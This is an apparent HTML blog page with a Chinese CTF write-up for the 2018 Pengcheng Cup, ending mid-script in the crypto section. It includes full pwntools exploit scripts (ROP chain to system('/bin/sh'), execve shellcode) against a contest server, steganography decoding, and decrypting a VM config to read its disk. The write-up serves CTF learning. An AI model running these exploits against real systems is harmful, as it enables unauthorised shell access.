@@ -1,0 +1,1076 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>PCB鹏城杯CTFwriteup&amp;复现 - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-12-03 12:33" pubdate>
+        2018年12月3日 下午
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:2k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      33
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">PCB鹏城杯CTFwriteup&amp;复现</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p><strong>大大大佬的博客-&gt;<a href="https://delcoding.github.io/2018/12/pcb-writeup/" target="_blank" rel="noopener">传送门</a></strong></p>
+<a id="more"></a>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="0x00-overInt"><a href="#0x00-overInt" class="headerlink" title="0x00 overInt"></a>0x00 overInt</h4><p>思路：有两个key的检测，过了之后有一个循环以下内容<br><pre><code class="hljs undefined">*(&amp;<span class="hljs-built_in">v8</span> + <span class="hljs-built_in">v6</span>) = <span class="hljs-built_in">v5</span><span class="hljs-comment">;</span>
+<span class="hljs-symbol">v3</span> = (int *)(unsigned int)<span class="hljs-built_in">v5</span><span class="hljs-comment">;</span>
+<span class="hljs-symbol">printf</span>(<span class="hljs-string">"str_pos is %c\n"</span>, <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span></code></pre></p>
+<p>这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop<br>exp如下<br><pre><code class="hljs undefined">from pwn import *
+from struct import pack
+context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)
+<span class="hljs-keyword">local</span> = <span class="hljs-number">0</span>
+log_level=<span class="hljs-string">'debug'</span>
+
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">local</span>:
+	p = process(<span class="hljs-string">"./overInt"</span>)<span class="hljs-meta">#,env=&#123;<span class="hljs-string">'LD_PRELOAD'</span>:<span class="hljs-string">'./libc_x64.so.6'</span>&#125;)</span>
+	elf = ELF(<span class="hljs-string">"./overInt"</span>)
+	<span class="hljs-meta">#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)</span>
+<span class="hljs-keyword">else</span>:
+	p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)
+	elf = ELF(<span class="hljs-string">"./overInt"</span>)
+	<span class="hljs-meta">#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)</span>
+
+def change_addr(num,<span class="hljs-built_in">string</span>):
+	j = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+		p.recvuntil(<span class="hljs-string">"Which position you want to modify?\n"</span>)
+		payload = p32(num)
+		p.<span class="hljs-built_in">send</span>(payload)
+		p.recvuntil(<span class="hljs-string">"What content you want to write in?\n"</span>)
+		payload = <span class="hljs-built_in">string</span>[j]
+		p.<span class="hljs-built_in">send</span>(payload)
+		num += <span class="hljs-number">1</span>
+		j += <span class="hljs-number">1</span>
+		
+pop_rdi = <span class="hljs-number">0x0000000000400b13</span>
+read_got = elf.got[<span class="hljs-string">"read"</span>] <span class="hljs-meta"># 0x602038</span>
+alarm_got = elf.got[<span class="hljs-string">"alarm"</span>] <span class="hljs-meta"># 0x602030</span>
+start = <span class="hljs-number">0x4005D0</span>
+puts_plt = elf.plt[<span class="hljs-string">"puts"</span>] <span class="hljs-meta"># 0x40054c</span>
+
+<span class="hljs-meta">#gdb.attach(p,<span class="hljs-string">"b *0x400AAC"</span>)</span>
+
+p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)
+p.<span class="hljs-built_in">send</span>(<span class="hljs-string">"over"</span>)
+p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">10</span>))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
+	data = p.recv()
+	p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0</span>))
+p.recv() 
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0x20633372</span>))
+
+p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">32</span>))
+
+<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#pop_rdi</span>
+change_addr(<span class="hljs-number">0x38</span>,<span class="hljs-built_in">string</span>)
+<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x38\x20\x60\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#read_got</span>
+change_addr(<span class="hljs-number">0x40</span>,<span class="hljs-built_in">string</span>)
+<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x4c\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#puts_plt</span>
+change_addr(<span class="hljs-number">0x48</span>,<span class="hljs-built_in">string</span>)
+<span class="hljs-built_in">string</span> = <span class="hljs-string">"\xd0\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#start</span>
+change_addr(<span class="hljs-number">0x50</span>,<span class="hljs-built_in">string</span>)
+p.recvuntil(<span class="hljs-string">"!"</span>)
+data = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)
+data = data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)
+data = u64(data)
+libc_base = data - <span class="hljs-number">0x0f7250</span>
+print <span class="hljs-string">"base : "</span>+<span class="hljs-built_in">hex</span>(libc_base)
+binsh_addr = libc_base + <span class="hljs-number">0x18cd57</span>
+system_addr = libc_base + <span class="hljs-number">0x045390</span>
+print <span class="hljs-string">"system_addr :"</span> +<span class="hljs-built_in">hex</span>(system_addr)
+print <span class="hljs-string">"binsh_addr :"</span> +<span class="hljs-built_in">hex</span>(binsh_addr)
+
+<span class="hljs-meta">#gdb.attach(p,<span class="hljs-string">"b *0x400AAC"</span>)</span>
+
+p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)
+p.<span class="hljs-built_in">send</span>(<span class="hljs-string">"over"</span>)
+p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">10</span>))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
+	data = p.recv()
+	p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0</span>))
+p.recv() 
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0x20633372</span>))
+p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)
+p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">24</span>))
+<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#pop_rdi</span>
+change_addr(<span class="hljs-number">0x38</span>,<span class="hljs-built_in">string</span>)
+<span class="hljs-built_in">string</span> = pack(<span class="hljs-string">'L'</span>,binsh_addr)
+change_addr(<span class="hljs-number">0x40</span>,<span class="hljs-built_in">string</span>)
+<span class="hljs-built_in">string</span> = pack(<span class="hljs-string">'L'</span>,system_addr)
+change_addr(<span class="hljs-number">0x48</span>,<span class="hljs-built_in">string</span>)
+
+p.interactive()</code></pre></p>
+<h4 id="0x01-treasure"><a href="#0x01-treasure" class="headerlink" title="0x01 treasure"></a>0x01 treasure</h4><p>这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。<br>exp如下：<br><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
+
+context(<span class="hljs-built_in">os</span>=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)
+<span class="hljs-keyword">local</span> = <span class="hljs-number">1</span>
+log_level=<span class="hljs-string">'debug'</span>
+
+<span class="hljs-keyword">if</span> <span class="hljs-name">local</span>:
+	p = process(<span class="hljs-string">"./treasure"</span>)#,env=&#123;<span class="hljs-string">'LD_PRELOAD'</span>:<span class="hljs-string">'./libc_x64.so.6'</span>&#125;)
+	elf = ELF(<span class="hljs-string">"./treasure"</span>)
+	#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)
+<span class="hljs-name">else</span>:
+	p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)
+	elf = ELF(<span class="hljs-string">"./overInt"</span>)
+	#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)
+
+def mycode(shellcode):
+	p.recvuntil(<span class="hljs-string">"(enter 'n' to quit) :"</span>)
+	p.sendline(<span class="hljs-string">"\x90"</span>)
+	p.recvuntil(<span class="hljs-string">"start!!!!"</span>)
+	p.send(shellcode)
+
+test = <span class="hljs-string">"abcdefghi"</span>
+
+#gdb.attach(p,<span class="hljs-string">"b *0x4009BA"</span> ) #b *<span class="hljs-number">0x400AAE</span><span class="hljs-string">")
+
+trea_addr = 0x4009BA
+
+shellcode = asm("</span>mov r15,rdx;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*6)
+mycode(shellcode)
+shellcode = asm("</span>mov ebx,<span class="hljs-number">0x400A6c</span>;mov r14,rbx;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*1)
+mycode(shellcode)
+
+shellcode = asm("</span>mov ebx,<span class="hljs-number">30</span>;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*4)
+mycode(shellcode)
+
+shellcode = asm("</span>mov rax,r15;mov rsi,rbx;jmp r14;<span class="hljs-string">")
+mycode(shellcode)
+
+shellcode = "</span>\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05<span class="hljs-string">"
+p.sendline(shellcode)
+"</span><span class="hljs-string">""</span>
+p.recvuntil(<span class="hljs-string">"(enter 'n' to quit) :"</span>)
+p.sendline(<span class="hljs-string">"\x90"</span>)
+p.recvuntil(<span class="hljs-string">"start!!!!"</span>)
+p.send(test)
+<span class="hljs-string">""</span><span class="hljs-string">"
+p.interactive()</span></code></pre></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x02-traffic-light"><a href="#0x02-traffic-light" class="headerlink" title="0x02 traffic light"></a>0x02 traffic light</h4><p>题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag</p>
+<h4 id="0x03-GreatWall"><a href="#0x03-GreatWall" class="headerlink" title="0x03 GreatWall"></a>0x03 GreatWall</h4><p>lsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符<br><pre><code class="hljs undefined">#encoding:utf-<span class="hljs-number">8</span>
+list1 = [<span class="hljs-number">1010011</span>,<span class="hljs-number">1110100,110011</span>,<span class="hljs-number">1100111,110100</span>,<span class="hljs-number">1101110,110000</span>,<span class="hljs-number">1100111</span>,<span class="hljs-number">1110010</span>,<span class="hljs-number">110100</span>,<span class="hljs-number">1110000</span>,<span class="hljs-number">1101000</span>,<span class="hljs-number">1111001</span>,<span class="hljs-number">1011111,110001</span>,<span class="hljs-number">1110011</span>,<span class="hljs-number">1011111,110001</span>,<span class="hljs-number">1101110,1110100</span>,<span class="hljs-number">110011</span>,<span class="hljs-number">1110010</span>,<span class="hljs-number">110011</span>,<span class="hljs-number">1110011</span>,<span class="hljs-number">1110100,110001</span>,<span class="hljs-number">1101110,1100111</span>]
+j = ''
+result =''
+for i in range(len(list1)):
+    tmp = int(str(list1[i]),<span class="hljs-number">2</span>)
+    result += chr(tmp)
+    print result</code></pre></p>
+<h4 id="0x04-hack1t"><a href="#0x04-hack1t" class="headerlink" title="0x04 hack1t"></a>0x04 hack1t</h4><p>这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解<br><a href="https://github.com/RF3/VMwareVMX" target="_blank" rel="noopener">GitHub项目</a><br>但是这个项目的代码有一点瑕疵，直接解密会触发一个错误<br><img src="/img/2018-12-03/1.png" srcset="/img/static/loading.gif" alt="1"><br><pre><code class="hljs undefined">root<span class="hljs-variable">@Ubuntu</span><span class="hljs-symbol">:~/Desktop/VMwareVMX-master</span><span class="hljs-comment"># python3 main.py "Ubuntu 64-bit.vmx" </span>
+<span class="hljs-symbol">Password:</span>
+<span class="hljs-symbol">Error:</span> File Ubuntu <span class="hljs-number">64</span>-bit.vmx is <span class="hljs-keyword">not</span> a valid VMX file</code></pre></p>
+<p>原因是代码中给的<code>displayname</code>是小写，但是判断却是大写<code>displayName</code>,修改成小写即可<br><img src="/img/2018-12-03/2.png" srcset="/img/static/loading.gif" alt="2"><br>然后就可以得到解密后的vmx配置信息<br><pre><code class="hljs undefined">root@Ubuntu:~/Desktop/VMwareVMX-master<span class="hljs-comment"># python3 main.py "Ubuntu 64-bit.vmx" </span>
+Password:
+<span class="hljs-attr">guestos</span> = <span class="hljs-string">"ubuntu-64"</span>
+virtualhw.<span class="hljs-attr">version</span> = <span class="hljs-string">"13"</span>
+config.<span class="hljs-attr">version</span> = <span class="hljs-string">"8"</span>
+<span class="hljs-attr">numvcpus</span> = <span class="hljs-string">"2"</span>
+cpuid.<span class="hljs-attr">coresPerSocket</span> = <span class="hljs-string">"1"</span>
+<span class="hljs-attr">memsize</span> = <span class="hljs-string">"2048"</span>
+pciBridge0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+pciBridge4.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+pciBridge4.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>
+pciBridge4.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>
+pciBridge5.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+pciBridge5.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>
+pciBridge5.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>
+pciBridge6.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+pciBridge6.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>
+pciBridge6.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>
+pciBridge7.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+pciBridge7.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>
+pciBridge7.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>
+vmci0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+mks.<span class="hljs-attr">enable3d</span> = <span class="hljs-string">"true"</span>
+scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">deviceType</span> = <span class="hljs-string">"disk"</span>
+scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">fileName</span> = <span class="hljs-string">"Ubuntu 64-bit-disk1.vmdk"</span>
+scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">mode</span> = <span class="hljs-string">"persistent"</span>
+scsi0.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"lsilogic"</span>
+scsi0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+sata0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>
+vmci0.<span class="hljs-attr">unrestricted</span> = <span class="hljs-string">"false"</span>
+vcpu.<span class="hljs-attr">hotadd</span> = <span class="hljs-string">"true"</span>
+mem.<span class="hljs-attr">hotadd</span> = <span class="hljs-string">"true"</span>
+powerType.<span class="hljs-attr">powerOff</span> = <span class="hljs-string">"soft"</span>
+powerType.<span class="hljs-attr">reset</span> = <span class="hljs-string">"soft"</span>
+powerType.<span class="hljs-attr">suspend</span> = <span class="hljs-string">"soft"</span>
+toolscripts.<span class="hljs-attr">afterpoweron</span> = <span class="hljs-string">"true"</span>
+toolscripts.<span class="hljs-attr">afterresume</span> = <span class="hljs-string">"true"</span>
+toolscripts.<span class="hljs-attr">beforepoweroff</span> = <span class="hljs-string">"true"</span>
+toolscripts.<span class="hljs-attr">beforesuspend</span> = <span class="hljs-string">"true"</span>
+tools.<span class="hljs-attr">syncTime</span> = <span class="hljs-string">"false"</span>
+<span class="hljs-attr">nvram</span> = <span class="hljs-string">"Ubuntu 64-bit-file1.nvram"</span>
+virtualHW.<span class="hljs-attr">productCompatibility</span> = <span class="hljs-string">"hosted"</span>
+<span class="hljs-attr">extendedConfigFile</span> = <span class="hljs-string">"Ubuntu 64-bit.vmxf"</span>
+<span class="hljs-attr">dataFileKey</span> = <span class="hljs-string">"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"</span>
+<span class="hljs-attr">cryptoState</span> = <span class="hljs-string">"encrypted"</span>
+isolation.tools.copy.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>
+isolation.tools.dnd.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>
+isolation.tools.paste.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>
+policy.vm.<span class="hljs-attr">mvmtid</span> = <span class="hljs-string">"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"</span>
+rollingTier0.<span class="hljs-attr">uid</span> = <span class="hljs-string">"1"</span>
+rollingTier0.<span class="hljs-attr">interval</span> = <span class="hljs-string">"86400"</span>
+rollingTier0.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>
+rollingTier0.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>
+rollingTier0.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>
+rollingTier1.<span class="hljs-attr">uid</span> = <span class="hljs-string">"2"</span>
+rollingTier1.<span class="hljs-attr">interval</span> = <span class="hljs-string">"604800"</span>
+rollingTier1.<span class="hljs-attr">baseTier</span> = <span class="hljs-string">"1"</span>
+rollingTier1.<span class="hljs-attr">baseTierInterval</span> = <span class="hljs-string">"7"</span>
+rollingTier1.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>
+rollingTier1.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>
+rollingTier1.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>
+rollingTier2.<span class="hljs-attr">uid</span> = <span class="hljs-string">"3"</span>
+rollingTier2.<span class="hljs-attr">interval</span> = <span class="hljs-string">"2419200"</span>
+rollingTier2.<span class="hljs-attr">baseTier</span> = <span class="hljs-string">"1"</span>
+rollingTier2.<span class="hljs-attr">baseTierInterval</span> = <span class="hljs-string">"28"</span>
+rollingTier2.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>
+rollingTier2.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>
+rollingTier2.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>
+snapshot.<span class="hljs-attr">numRollingTiers</span> = <span class="hljs-string">"3"</span>
+floppy0.<span class="hljs-attr">present</span> = <span class="hljs-string">"FALSE"</span>
+uuid.<span class="hljs-attr">bios</span> = <span class="hljs-string">"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb"</span>
+uuid.<span class="hljs-attr">location</span> = <span class="hljs-string">"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb"</span>
+migrate.<span class="hljs-attr">hostlog</span> = <span class="hljs-string">".\Ubuntu 64-bit-0dae80fb.hlog"</span>
+scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">redo</span> = <span class="hljs-string">""</span>
+pciBridge0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"17"</span>
+pciBridge4.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"21"</span>
+pciBridge5.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"22"</span>
+pciBridge6.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"23"</span>
+pciBridge7.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"24"</span>
+scsi0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"16"</span>
+vmci0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"32"</span>
+sata0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"33"</span>
+vmci0.<span class="hljs-attr">id</span> = <span class="hljs-string">"-119750326"</span>
+monitor.<span class="hljs-attr">phys_bits_used</span> = <span class="hljs-string">"43"</span>
+vmotion.<span class="hljs-attr">checkpointFBSize</span> = <span class="hljs-string">"4194304"</span>
+vmotion.<span class="hljs-attr">checkpointSVGAPrimarySize</span> = <span class="hljs-string">"134217728"</span>
+<span class="hljs-attr">cleanShutdown</span> = <span class="hljs-string">"TRUE"</span>
+<span class="hljs-attr">softPowerOff</span> = <span class="hljs-string">"FALSE"</span>
+svga.<span class="hljs-attr">guestBackedPrimaryAware</span> = <span class="hljs-string">"TRUE"</span>
+rollingTier0.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>
+rollingTier1.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>
+rollingTier2.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>
+svga.<span class="hljs-attr">vramSize</span> = <span class="hljs-string">"134217728"</span></code></pre></p>
+<p>用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码<br><pre><code class="hljs undefined">sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.deviceType</span> = <span class="hljs-string">"cdrom-image"</span>
+sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.fileName</span> = <span class="hljs-string">"D:\kali\kali-linux-2018.2-amd64.iso"</span>
+sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.present</span> = <span class="hljs-string">"TRUE"</span></code></pre></p>
+<p>加到上面的代码上去重新加密一下<br><pre><code class="hljs undefined">root<span class="hljs-variable">@Ubuntu</span><span class="hljs-symbol">:~/Desktop/VMwareVMX-master</span><span class="hljs-comment"># python3 main.py -e -D "Ubuntu 64-bit" -p bibinb ubuntu.vmx result.vmx</span></code></pre></p>
+<p><code>-D</code>指定虚拟机的名字，<code>ubuntu.vmx</code>待加密的文件，<code>result.vmx</code>加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD<br><img src="/img/2018-12-03/3.png" srcset="/img/static/loading.gif" alt="3"><br>开机按esc进BIOS选CD/DVD启动<br><img src="/img/2018-12-03/4.png" srcset="/img/static/loading.gif" alt="4"><br>选第一个<br><img src="/img/2018-12-03/5.png" srcset="/img/static/loading.gif" alt="5"><br>进到kali里打开文件系统<br><img src="/img/2018-12-03/6.jpg" srcset="/img/static/loading.gif" alt="6"><br>find一下<br><img src="/img/2018-12-03/7.png" srcset="/img/static/loading.gif" alt="7"><br>把4个部分凑一起打开就getflag<br><img src="/img/2018-12-03/8.png" srcset="/img/static/loading.gif" alt="8"></p>
+<h4 id="0x05-What’s-this"><a href="#0x05-What’s-this" class="headerlink" title="0x05 What’s_this"></a>0x05 What’s_this</h4><p><a href="https://delcoding.github.io/2018/12/pcb-writeup/" target="_blank" rel="noopener">文件删了复现不了了，只能看大佬的博客了</a></p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x04-easy-crypto"><a href="#0x04-easy-crypto" class="headerlink" title="0x04 easy crypto"></a>0x04 easy crypto</h4><p>本质就是异或，逆操作一遍就可以了<br>payloa如下：<br><pre><code class="hljs undefined"><span class="hljs-comment">#!usr/bin/python </span>
+<span class="hljs-comment">#_*_ coding=UTF-8 _*_</span>
+
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+from Crypto import Random
+import sys
+<span class="hljs-comment">#from FLAG import flag</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aesdemo</span>:</span>
+	<span class="hljs-comment">#aes = AES.new(key,mode)</span>
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,key)</span></span>:
+		<span class="hljs-keyword">self</span>.key = key
